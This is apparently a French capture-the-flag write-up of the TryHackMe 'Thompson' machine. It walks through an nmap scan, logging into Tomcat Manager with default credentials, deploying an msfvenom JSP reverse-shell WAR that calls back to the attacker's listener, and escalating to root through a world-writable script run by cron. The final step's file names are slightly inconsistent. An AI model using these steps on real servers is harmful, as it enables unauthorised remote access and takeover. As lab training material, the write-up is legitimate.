# Thompson #

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.124.176 thompson.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 
```

Création d'un nom de domaine pour faciliter le CTF.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A thompson.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 09:56 CEST
Nmap scan report for thompson.thm (10.10.124.176)
Host is up (0.035s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/18%OT=22%CT=1%CU=41491%PV=Y%DS=2%DC=T%G=Y%TM=60F3DED
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   34.81 ms 10.9.0.1
2   35.15 ms thompson.thm (10.10.124.176)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.96 second
```

Ici on voit plusieurs ports ouverts.  
-Le service SSH sur le port 22 
-Le service ajp13 sur le port 8009
-Le service http sur le port 8080, ce qui est intéressant c'est nmap indique une version de tomcat 8.5.5  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ lynx http://thompson.thm:8080/
                                                                                                                                                                                                              Apache Tomcat/8.5.5 (p1 sur 3)
   Home Documentation Configuration Examples Wiki Mailing Lists Find Help

Apache Tomcat/8.5.5

If you're seeing this, you've successfully installed Tomcat. Congratulations!

   [tomcat logo]

Recommended Reading:

Security Considerations HOW-TO

Manager Application HOW-TO

Clustering/Session Replication HOW-TO

   Server Status
   Manager App
   Host Manager

Developer Quick Start

   Tomcat Setup

   First Web Application

   Realms & AAA

   JDBC DataSources

   Examples

   Servlet Specifications

   Tomcat Versions

Managing Tomcat

   For security, access to the manager webapp is restricted. Users are defined in:
$CATALINA_HOME/conf/tomcat-users.xml

   In Tomcat 8.5 access to the manager application is split between different users.   Read more...

Release Notes

Changelog

Migration Guide
```

On trouve un lien intéressant Manager App.

```bash
←←←                                                                                                                                                                                                                           401 Unauthorized
                                                                                                               401 Unauthorized

   You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

   For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

   Note that for Tomcat 7 onwards, the roles required to use the manager application were changed from the single manager role to the following four roles. You will need to assign the role(s) required for the functionality you wish
   to access.
     * manager-gui - allows access to the HTML GUI and the status pages
     * manager-script - allows access to the text interface and the status pages
     * manager-jmx - allows access to the JMX proxy and the status pages
     * manager-status - allows access to the status pages only

   The HTML interface is protected against CSRF but the text and JMX interfaces are not. To maintain the CSRF protection:
     * Users with the manager-gui role should not be granted either the manager-script or manager-jmx roles.
     * If the text or jmx interfaces are accessed through a browser (e.g. for testing since these interfaces are intended for tools not humans) then the browser must be closed afterwards to terminate the session.

   For more information - please see the Manager App HOW-TO.

```
Quand on va sur le lien ça nous demande une authentification, comme on a pas les bons identifiant nous avons une page d'erreur.  
Dans la page d'erreur nous avons des identifiants.  
-nom d'utilisateur : tomcat
-mot de pase       : s3cret

```bash
  The Apache Software Foundation The Tomcat Servlet/JSP Container
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________

   Tomcat Web Application Manager

   Message:
OK

   Manager
   List Applications HTML Manager Help Manager Help Server Status

   Applications
   Path Version Display Name Running Sessions Commands
   / None specified Welcome to Tomcat true 0  Start  Stop
   Reload
   Undeploy
     Expire sessions with idle ≥  30___ minutes
   /docs None specified Tomcat Documentation true 0  Start  Stop
   Reload
   Undeploy
     Expire sessions with idle ≥  30___ minutes
   /examples None specified Servlet and JSP Examples true 0  Start  Stop
   Reload
   Undeploy
     Expire sessions with idle ≥  30___ minutes
   /hgkFDt6wiHIUB29WWEON5PA None specified   true 0  Start  Stop
   Reload
   Undeploy
     Expire sessions with idle ≥  30___ minutes
   /host-manager None specified Tomcat Host Manager Application true 0  Start  Stop
   Reload
   Undeploy
     Expire sessions with idle ≥  30___ minutes
   /manager None specified Tomcat Manager Application true 1  Start   Stop   Reload   Undeploy
     Expire sessions with idle ≥  30___ minutes

   Deploy
   Deploy directory or WAR file located on server
   Context Path (required):    ____________________
   XML Configuration file URL: ____________________
   WAR or Directory URL:       ________________________________________
                               Deploy
   WAR file to deploy
   Select WAR file to upload ________________________________________
                             Deploy

   Diagnostics
   Check to see if a web application has caused a memory leak on stop, reload or undeploy

```

Avec les identifiant on tombe sur une page ou on peut deployer un fichier war.  
Un fichier war est un fichier jar pour contenir un ensemble de JavaSerser Pages, il est possible de forger un reverse shell.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.228.66 LPORT=1234 -f war > shell.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
```

Création du shell.  

```bash
WAR file to deploy
   Select WAR file to upload shell.war_______________________________
                             Deploy
```

Deployment du shell.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
```

On écoute le port 1234 pour établir une connexion avec le reverse shell.  

```bash
 /shell None specified   true 0  Start  Stop
   Reload
```

On clique sur le lien du shell dans la page ou on a déployé le shell.

```bash
im@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.124.176] 58154
whoami
tomcat
pwd
/
cd home
ls
jack
cd jack	
cat user.txt
39400c90bc683a41a8935e4719f181bf
```

Une fois la connexion établie on est sur l'utilisateur tomcat et nous pouvons récupérer notre premier flag.  
Réponse : 39400c90bc683a41a8935e4719f181bf 

```bash
ls -al
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Jul 18 01:48 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```

cat id.sh
#!/bin/bash
id > test.txt

cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh
#

```

Ici on voit qu'il un script id.sh qui est en mode écriture pour tout le monde.  
De plus en regardant dans la configuration crontab on remarque que le script est appellé avec les droits root.  

```bash
echo "cat /root/root.txt > flag.sh" >> id.sh
cat flag.txt
d89d5391984c0450a95497153ae7ca3a
```

On modifie le fichier pour le script écrit le réponse dans un fichier que l'on a droit de lire.  
On lit le fichier.  

La réponse est : d89d5391984c0450a95497153ae7ca3a  